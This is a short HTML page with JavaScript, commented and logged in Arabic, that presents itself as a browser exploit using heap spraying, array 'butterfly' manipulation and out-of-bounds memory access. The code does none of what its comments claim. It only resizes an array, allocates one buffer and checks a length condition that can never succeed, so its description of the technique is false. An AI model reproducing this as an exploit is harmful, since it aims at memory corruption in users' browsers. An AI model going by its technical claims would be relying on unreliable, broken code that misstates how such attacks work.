<!DOCTYPE html>
<html>
<body style="background:#000; color:#0f0; font-family:monospace; padding:20px;">
    <div id="log">بدء العملية...</div>
<script>
    function log(m) { document.getElementById('log').innerHTML += "<div>" + m + "</div>"; }

    try {
        // 1. إنشاء مصفوفة بها "فجوة" (Hole)
        let arr = [1.1, 2.2, 3.3];
        arr.length = 0x1000;
        
        // 2. استخدام "الرش" (Heap Spraying) لإجبار المصفوفة 
        // على الامتداد فوق منطقة ذاكرة نتحكم فيها
        let buffer = new ArrayBuffer(0x2000);
        let floatView = new Float64Array(buffer);
        
        log("جاري التلاعب ببنود المصفوفة (Butterfly Manipulation)...");
        
        // 3. قراءة المنطقة المجاورة للمصفوفة مباشرة
        // سنحاول قراءة "طول المصفوفة" (Length)
        let length = arr.length;
        log("طول المصفوفة المقروء: " + length);
        
        // إذا نجح التلاعب، يجب أن نرى طولاً مختلفاً عما حددناه
        if (length > 0x1000) {
            log("نجاح! تم تجاوز حدود الذاكرة (Out of Bounds Access)!");
        }

    } catch(e) {
        log("خطأ في البنية: " + e.message);
    }
</script>






</body>
</html>
